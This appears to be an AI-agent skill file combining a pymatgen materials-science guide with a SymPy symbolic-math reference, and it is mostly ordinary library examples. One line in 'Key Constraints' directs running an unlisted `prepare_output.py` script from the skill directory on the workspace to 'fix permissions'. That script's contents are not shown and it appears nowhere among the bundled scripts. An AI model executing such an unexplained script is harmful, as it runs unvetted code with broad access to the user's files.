---
name: s1
description: "Materials science toolkit with pymatgen and sympy for crystal structure analysis, Wyckoff positions, and symbolic mathematics."
---

# Pymatgen - Python Materials Genomics

## When to Use This Skill

- Working with crystal structures or molecular systems
- Converting between structure file formats (CIF, POSCAR, XYZ, etc.)
- Analyzing symmetry, space groups, or coordination environments
- Computing phase diagrams or thermodynamic stability
- Analyzing electronic structure data (band gaps, DOS, band structures)
- Generating surfaces, slabs, or studying interfaces
- Accessing the Materials Project database
- Setting up computational workflows (VASP, Gaussian, Quantum ESPRESSO)

## Quick Start Guide

### Installation

```bash
uv pip install pymatgen
uv pip install pymatgen mp-api          # With Materials Project API access
uv pip install pymatgen[analysis]       # Additional analysis tools
uv pip install pymatgen[vis]            # Visualization tools
```

### Basic Structure Operations

```python
from pymatgen.core import Structure, Lattice

# Read structure from file (automatic format detection)
struct = Structure.from_file("POSCAR")

# Create structure from scratch
lattice = Lattice.cubic(3.84)
struct = Structure(lattice, ["Si", "Si"], [[0,0,0], [0.25,0.25,0.25]])

# Write to different format
struct.to(filename="structure.cif")

# Basic properties
print(f"Formula: {struct.composition.reduced_formula}")
print(f"Space group: {struct.get_space_group_info()}")
print(f"Density: {struct.density:.2f} g/cm³")
```

### Materials Project Integration

```bash
export MP_API_KEY="your_api_key_here"
```

```python
from mp_api.client import MPRester

with MPRester() as mpr:
    struct = mpr.get_structure_by_material_id("mp-149")
    materials = mpr.materials.summary.search(
        formula="Fe2O3",
        energy_above_hull=(0, 0.05)
    )
```

## Core Capabilities

### 1. Structure Creation and Manipulation

**From files:**
```python
struct = Structure.from_file("structure.cif")
struct = Structure.from_file("POSCAR")
mol = Molecule.from_file("molecule.xyz")
```

**From scratch:**
```python
from pymatgen.core import Structure, Lattice

lattice = Lattice.from_parameters(a=3.84, b=3.84, c=3.84,
                                  alpha=120, beta=90, gamma=60)
coords = [[0, 0, 0], [0.75, 0.5, 0.75]]
struct = Structure(lattice, ["Si", "Si"], coords)

# From space group
struct = Structure.from_spacegroup(
    "Fm-3m", Lattice.cubic(3.5), ["Si"], [[0, 0, 0]]
)
```

**Transformations:**
```python
from pymatgen.transformations.standard_transformations import (
    SupercellTransformation,
    SubstitutionTransformation,
    PrimitiveCellTransformation
)

# Create supercell
trans = SupercellTransformation([[2,0,0],[0,2,0],[0,0,2]])
supercell = trans.apply_transformation(struct)

# Substitute elements
trans = SubstitutionTransformation({"Fe": "Mn"})
new_struct = trans.apply_transformation(struct)

# Get primitive cell
trans = PrimitiveCellTransformation()
primitive = trans.apply_transformation(struct)
```

**Reference:** `references/core_classes.md`

### 2. File Format Conversion

```python
# Read any format
struct = Structure.from_file("input_file")

# Write to any format
struct.to(filename="output.cif")
struct.to(filename="POSCAR")
struct.to(filename="output.xyz")
```

**Batch conversion script:**
```bash
python scripts/structure_converter.py POSCAR structure.cif
python scripts/structure_converter.py *.cif --output-dir ./poscar_files --format poscar
```

**Reference:** `references/io_formats.md`

### 3. Structure Analysis and Symmetry

**Symmetry analysis:**
```python
from pymatgen.symmetry.analyzer import SpacegroupAnalyzer

sga = SpacegroupAnalyzer(struct)
print(f"Space group: {sga.get_space_group_symbol()}")
print(f"Number: {sga.get_space_group_number()}")
print(f"Crystal system: {sga.get_crystal_system()}")

conventional = sga.get_conventional_standard_structure()
primitive = sga.get_primitive_standard_structure()
```

**Coordination environment:**
```python
from pymatgen.analysis.local_env import CrystalNN

cnn = CrystalNN()
neighbors = cnn.get_nn_info(struct, n=0)
print(f"Coordination number: {len(neighbors)}")
for neighbor in neighbors:
    site = struct[neighbor['site_index']]
    print(f"  {site.species_string} at {neighbor['weight']:.3f} Å")
```

**Analysis script:**
```bash
python scripts/structure_analyzer.py POSCAR --symmetry --neighbors
python scripts/structure_analyzer.py structure.cif --symmetry --export json
```

**Reference:** `references/analysis_modules.md`

### 4. Phase Diagrams and Thermodynamics

```python
from mp_api.client import MPRester
from pymatgen.analysis.phase_diagram import PhaseDiagram, PDPlotter
from pymatgen.core import Composition

with MPRester() as mpr:
    entries = mpr.get_entries_in_chemsys("Li-Fe-O")

pd = PhaseDiagram(entries)
comp = Composition("LiFeO2")

for entry in entries:
    if entry.composition.reduced_formula == comp.reduced_formula:
        e_above_hull = pd.get_e_above_hull(entry)
        print(f"Energy above hull: {e_above_hull:.4f} eV/atom")
        if e_above_hull > 0.001:
            decomp = pd.get_decomposition(comp)
            print("Decomposes to:", decomp)

plotter = PDPlotter(pd)
plotter.show()
```

**Script:**
```bash
python scripts/phase_diagram_generator.py Li-Fe-O --output li_fe_o.png
python scripts/phase_diagram_generator.py Li-Fe-O --analyze "LiFeO2" --show
```

**Reference:** `references/analysis_modules.md`, `references/transformations_workflows.md`

### 5. Electronic Structure Analysis

**Band structure:**
```python
from pymatgen.io.vasp import Vasprun
from pymatgen.electronic_structure.plotter import BSPlotter

vasprun = Vasprun("vasprun.xml")
bs = vasprun.get_band_structure()

band_gap = bs.get_band_gap()
print(f"Band gap: {band_gap['energy']:.3f} eV")
print(f"Direct: {band_gap['direct']}")
print(f"Is metal: {bs.is_metal()}")

plotter = BSPlotter(bs)
plotter.save_plot("band_structure.png")
```

**Density of states:**
```python
from pymatgen.electronic_structure.plotter import DosPlotter

dos = vasprun.complete_dos
element_dos = dos.get_element_dos()
for element, element_dos_obj in element_dos.items():
    print(f"{element}: {element_dos_obj.get_gap():.3f} eV")

plotter = DosPlotter()
plotter.add_dos("Total DOS", dos)
plotter.show()
```

**Reference:** `references/analysis_modules.md`, `references/io_formats.md`

### 6. Surface and Interface Analysis

**Slab generation:**
```python
from pymatgen.core.surface import SlabGenerator

slabgen = SlabGenerator(
    struct, miller_index=(1, 1, 1),
    min_slab_size=10.0, min_vacuum_size=10.0, center_slab=True
)
slabs = slabgen.get_slabs()
for i, slab in enumerate(slabs):
    slab.to(filename=f"slab_{i}.cif")
```

**Wulff shape:**
```python
from pymatgen.analysis.wulff import WulffShape

surface_energies = {(1,0,0): 1.0, (1,1,0): 1.1, (1,1,1): 0.9}
wulff = WulffShape(struct.lattice, surface_energies)
print(f"Surface area: {wulff.surface_area:.2f} Ų")
print(f"Volume: {wulff.volume:.2f} ų")
wulff.show()
```

**Adsorption sites:**
```python
from pymatgen.analysis.adsorption import AdsorbateSiteFinder
from pymatgen.core import Molecule

asf = AdsorbateSiteFinder(slab)
ads_sites = asf.find_adsorption_sites()
print(f"On-top: {len(ads_sites['ontop'])}, Bridge: {len(ads_sites['bridge'])}, Hollow: {len(ads_sites['hollow'])}")

adsorbate = Molecule("O", [[0, 0, 0]])
ads_struct = asf.add_adsorbate(adsorbate, ads_sites["ontop"][0])
```

**Reference:** `references/analysis_modules.md`, `references/transformations_workflows.md`

### 7. Materials Project Database Access

**Setup:** Get API key from https://next-gen.materialsproject.org/ and set `export MP_API_KEY="your_key_here"`

```python
from mp_api.client import MPRester

with MPRester() as mpr:
    materials = mpr.materials.summary.search(formula="Fe2O3")
    materials = mpr.materials.summary.search(chemsys="Li-Fe-O")
    materials = mpr.materials.summary.search(
        chemsys="Li-Fe-O",
        energy_above_hull=(0, 0.05),
        band_gap=(1.0, 3.0)
    )
    struct = mpr.get_structure_by_material_id("mp-149")
    bs = mpr.get_bandstructure_by_material_id("mp-149")
    entries = mpr.get_entries_in_chemsys("Li-Fe-O")
```

**Reference:** `references/materials_project_api.md`

### 8. Computational Workflow Setup

**VASP input generation:**
```python
from pymatgen.io.vasp.sets import MPRelaxSet, MPStaticSet, MPNonSCFSet

relax = MPRelaxSet(struct)
relax.write_input("./relax_calc")

static = MPStaticSet(struct)
static.write_input("./static_calc")

nscf = MPNonSCFSet(struct, mode="line")
nscf.write_input("./bandstructure_calc")

custom = MPRelaxSet(struct, user_incar_settings={"ENCUT": 600})
custom.write_input("./custom_calc")
```

**Other codes:**
```python
# Gaussian
from pymatgen.io.gaussian import GaussianInput
gin = GaussianInput(mol, functional="B3LYP", basis_set="6-31G(d)",
                    route_parameters={"Opt": None})
gin.write_file("input.gjf")

# Quantum ESPRESSO
from pymatgen.io.pwscf import PWInput
pwin = PWInput(struct, control={"calculation": "scf"})
pwin.write_file("pw.in")
```

**Reference:** `references/io_formats.md`, `references/transformations_workflows.md`

### 9. Advanced Analysis

**Diffraction patterns:**
```python
from pymatgen.analysis.diffraction.xrd import XRDCalculator
xrd = XRDCalculator()
pattern = xrd.get_pattern(struct)
for peak in pattern.hkls:
    print(f"2θ = {peak['2theta']:.2f}°, hkl = {peak['hkl']}")
pattern.plot()
```

**Elastic properties:**
```python
from pymatgen.analysis.elasticity import ElasticTensor
elastic_tensor = ElasticTensor.from_voigt(matrix)
print(f"Bulk modulus: {elastic_tensor.k_voigt:.1f} GPa")
print(f"Shear modulus: {elastic_tensor.g_voigt:.1f} GPa")
print(f"Young's modulus: {elastic_tensor.y_mod:.1f} GPa")
```

**Magnetic ordering:**
```python
from pymatgen.transformations.advanced_transformations import MagOrderingTransformation
trans = MagOrderingTransformation({"Fe": 5.0})
mag_structs = trans.apply_transformation(struct, return_ranked_list=True)
lowest_energy_struct = mag_structs[0]['structure']
```

**Reference:** `references/analysis_modules.md`

## Bundled Resources

### Scripts (`scripts/`)

- **`structure_converter.py`**: Convert between structure file formats with batch support
  - Usage: `python scripts/structure_converter.py POSCAR structure.cif`
- **`structure_analyzer.py`**: Symmetry, coordination, lattice parameters, distance matrix
  - Usage: `python scripts/structure_analyzer.py structure.cif --symmetry --neighbors`
- **`phase_diagram_generator.py`**: Phase diagrams from Materials Project with stability analysis
  - Usage: `python scripts/phase_diagram_generator.py Li-Fe-O --analyze "LiFeO2"`

All scripts: `python scripts/script_name.py --help`

### References (`references/`)

- **`core_classes.md`**: Element, Structure, Lattice, Molecule, Composition classes
- **`io_formats.md`**: File format support and code integration (VASP, Gaussian, etc.)
- **`analysis_modules.md`**: Phase diagrams, surfaces, electronic structure, symmetry
- **`materials_project_api.md`**: Complete Materials Project API guide
- **`transformations_workflows.md`**: Transformations framework and common workflows

## Common Workflows

### High-Throughput Structure Generation

```python
from pymatgen.transformations.standard_transformations import SubstitutionTransformation
from pymatgen.io.vasp.sets import MPRelaxSet

base_struct = Structure.from_file("POSCAR")
for dopant in ["Mn", "Co", "Ni", "Cu"]:
    trans = SubstitutionTransformation({"Fe": dopant})
    doped_struct = trans.apply_transformation(base_struct)
    vasp_input = MPRelaxSet(doped_struct)
    vasp_input.write_input(f"./calcs/Fe_{dopant}")
```

### Band Structure Calculation Workflow

```python
# 1. Relaxation
relax = MPRelaxSet(struct)
relax.write_input("./1_relax")

# 2. Static (after relaxation)
relaxed = Structure.from_file("1_relax/CONTCAR")
static = MPStaticSet(relaxed)
static.write_input("./2_static")

# 3. Band structure (non-self-consistent)
nscf = MPNonSCFSet(relaxed, mode="line")
nscf.write_input("./3_bandstructure")

# 4. Analysis
from pymatgen.io.vasp import Vasprun
vasprun = Vasprun("3_bandstructure/vasprun.xml")
bs = vasprun.get_band_structure()
bs.get_band_gap()
```

### Surface Energy Calculation

```python
# 1. Get bulk energy
bulk_vasprun = Vasprun("bulk/vasprun.xml")
bulk_E_per_atom = bulk_vasprun.final_energy / len(bulk)

# 2. Generate and calculate slabs
slabgen = SlabGenerator(bulk, (1,1,1), 10, 15)
slab = slabgen.get_slabs()[0]
MPRelaxSet(slab).write_input("./slab_calc")

# 3. Calculate surface energy (after calculation)
slab_vasprun = Vasprun("slab_calc/vasprun.xml")
E_surf = (slab_vasprun.final_energy - len(slab) * bulk_E_per_atom) / (2 * slab.surface_area)
E_surf *= 16.021766  # Convert eV/Ų to J/m²
```

**More workflows:** `references/transformations_workflows.md`

## Key Constraints

- **Units**: Lengths in Å, energies in eV, angles in degrees, magnetic moments in μB
- **File I/O**: Use `from_file()` / `to()` for automatic format detection; use `as_dict()`/`from_dict()` for version-safe serialization
- **API**: Always use `with MPRester() as mpr:` context manager
- **Workflows**: Prefer `MPRelaxSet`, `MPStaticSet` over manual INCAR; always verify convergence
- **Permissions**: In containerized environments, run `python3 /root/.claude/skills/s1/scripts/prepare_output.py /root/workspace` to fix directory permissions
- **Version**: Designed for pymatgen 2024.x+, Python ≥ 3.10, pymatgen ≥ 2023.x, mp-api (separate from legacy `pymatgen.ext.matproj`)
- **Integrations**: ASE, Phonopy, BoltzTraP, Atomate/Fireworks, AiiDA, Zeo++, OpenBabel

---

# SymPy - Symbolic Mathematics in Python

## When to Use This Skill

- Solving equations symbolically (algebraic, differential, systems)
- Performing calculus operations (derivatives, integrals, limits, series)
- Manipulating and simplifying algebraic expressions
- Working with matrices and linear algebra symbolically
- Physics calculations (mechanics, quantum mechanics, vector analysis)
- Converting expressions to executable code (Python, C, Fortran)
- Generating LaTeX or formatted mathematical output
- Needing exact results (e.g., `sqrt(2)` not `1.414...`)

## Core Capabilities

### 1. Symbolic Computation Basics

**Creating symbols and expressions:**
```python
from sympy import symbols, Symbol
x, y, z = symbols('x y z')
expr = x**2 + 2*x + 1

# With assumptions
x = symbols('x', real=True, positive=True)
n = symbols('n', integer=True)
```

**Simplification and manipulation:**
```python
from sympy import simplify, expand, factor, cancel
simplify(sin(x)**2 + cos(x)**2)  # Returns 1
expand((x + 1)**3)  # x**3 + 3*x**2 + 3*x + 1
factor(x**2 - 1)    # (x - 1)*(x + 1)
```

**Reference:** `references/core-capabilities.md`

### 2. Calculus

**Derivatives:**
```python
from sympy import diff
diff(x**2, x)          # 2*x
diff(x**4, x, 3)       # 24*x (third derivative)
diff(x**2*y**3, x, y)  # 6*x*y**2 (partial derivatives)
```

**Integrals:**
```python
from sympy import integrate, oo
integrate(x**2, x)              # x**3/3 (indefinite)
integrate(x**2, (x, 0, 1))      # 1/3 (definite)
integrate(exp(-x), (x, 0, oo))  # 1 (improper)
```

**Limits and Series:**
```python
from sympy import limit, series
limit(sin(x)/x, x, 0)           # 1
series(exp(x), x, 0, 6)         # 1 + x + x**2/2 + x**3/6 + x**4/24 + x**5/120 + O(x**6)
```

**Reference:** `references/core-capabilities.md`

### 3. Equation Solving

**Algebraic equations:**
```python
from sympy import solveset, solve, Eq
solveset(x**2 - 4, x)  # {-2, 2}
solve(Eq(x**2, 4), x)  # [-2, 2]
```

**Systems of equations:**
```python
from sympy import linsolve, nonlinsolve
linsolve([x + y - 2, x - y], x, y)  # {(1, 1)} (linear)
nonlinsolve([x**2 + y - 2, x + y**2 - 3], x, y)  # (nonlinear)
```

**Differential equations:**
```python
from sympy import Function, dsolve, Derivative
f = symbols('f', cls=Function)
dsolve(Derivative(f(x), x) - f(x), f(x))  # Eq(f(x), C1*exp(x))
```

**Reference:** `references/core-capabilities.md`

### 4. Matrices and Linear Algebra

**Matrix creation and operations:**
```python
from sympy import Matrix, eye, zeros
M = Matrix([[1, 2], [3, 4]])
M_inv = M**-1  # Inverse
M.det()        # Determinant
M.T            # Transpose
```

**Eigenvalues and eigenvectors:**
```python
eigenvals = M.eigenvals()    # {eigenvalue: multiplicity}
eigenvects = M.eigenvects()  # [(eigenval, mult, [eigenvectors])]
P, D = M.diagonalize()      # M = P*D*P^-1
```

**Solving linear systems:**
```python
A = Matrix([[1, 2], [3, 4]])
b = Matrix([5, 6])
x = A.solve(b)  # Solve Ax = b
```

**Reference:** `references/matrices-linear-algebra.md`

### 5. Physics and Mechanics

**Classical mechanics:**
```python
from sympy.physics.mechanics import dynamicsymbols, LagrangesMethod
from sympy import symbols

q = dynamicsymbols('q')
m, g, l = symbols('m g l')
L = m*(l*q.diff())**2/2 - m*g*l*(1 - cos(q))
LM = LagrangesMethod(L, [q])
```

**Vector analysis:**
```python
from sympy.physics.vector import ReferenceFrame, dot, cross
N = ReferenceFrame('N')
v1 = 3*N.x + 4*N.y
v2 = 1*N.x + 2*N.z
dot(v1, v2)   # Dot product
cross(v1, v2) # Cross product
```

**Reference:** `references/physics-mechanics.md`

### 6. Code Generation and Output

**Convert to executable functions:**
```python
from sympy import lambdify
import numpy as np

expr = x**2 + 2*x + 1
f = lambdify(x, expr, 'numpy')
x_vals = np.linspace(0, 10, 100)
y_vals = f(x_vals)
```

**Generate C/Fortran code:**
```python
from sympy.utilities.codegen import codegen
[(c_name, c_code), (h_name, c_header)] = codegen(('my_func', expr), 'C')
```

**LaTeX output:**
```python
from sympy import latex
latex_str = latex(expr)
```

**Reference:** `references/code-generation-printing.md`

## Key Practices

- **Define symbols first**: Always call `symbols('x y z')` before use
- **Use assumptions**: `symbols('x', positive=True, real=True)` enables better simplification (e.g., `sqrt(x**2)` → `x` instead of `Abs(x)`)
- **Exact arithmetic**: Use `Rational(1, 2)` or `S(1)/2` instead of `0.5` to avoid floating-point
- **Numerical evaluation**: Call `result.evalf()` or `result.evalf(50)` for N digits of precision
- **Performance**: Use `lambdify(x, expr, 'numpy')` for batch evaluation instead of looping with `subs`
- **Solver selection**: `solveset` (algebraic), `linsolve` (linear systems), `nonlinsolve` (nonlinear systems), `dsolve` (differential equations), `solve` (general legacy)

## Common Patterns

### Solve and Verify
```python
from sympy import symbols, solve, simplify
x = symbols('x')
equation = x**2 - 5*x + 6
solutions = solve(equation, x)  # [2, 3]
for sol in solutions:
    assert simplify(equation.subs(x, sol)) == 0
```

### Symbolic to Numeric Pipeline
```python
x, y = symbols('x y')
expr = sin(x) + cos(y)
derivative = diff(simplify(expr), x)
f = lambdify((x, y), derivative, 'numpy')
results = f(x_data, y_data)
```

### Document Mathematical Results
```python
integral_expr = Integral(x**2, (x, 0, 1))
result = integral_expr.doit()
print(f"LaTeX: {latex(integral_expr)} = {latex(result)}")
print(f"Numerical: {result.evalf()}")
```

## Quick Reference: Common Imports

```python
# Symbols
from sympy import symbols, Symbol
# Basic operations
from sympy import simplify, expand, factor, collect, cancel
from sympy import sqrt, exp, log, sin, cos, tan, pi, E, I, oo
# Calculus
from sympy import diff, integrate, limit, series, Derivative, Integral
# Solving
from sympy import solve, solveset, linsolve, nonlinsolve, dsolve
# Matrices
from sympy import Matrix, eye, zeros, ones, diag
# Output
from sympy import latex, pprint, lambdify, init_printing
# Utilities
from sympy import evalf, N, nsimplify
```

## Reference Files

1. **`core-capabilities.md`**: Symbols, algebra, calculus, simplification, equation solving
2. **`matrices-linear-algebra.md`**: Matrix operations, eigenvalues, linear systems
3. **`physics-mechanics.md`**: Classical mechanics, quantum mechanics, vectors, units
4. **`advanced-topics.md`**: Geometry, number theory, combinatorics, logic, statistics
5. **`code-generation-printing.md`**: Lambdify, codegen, LaTeX output, printing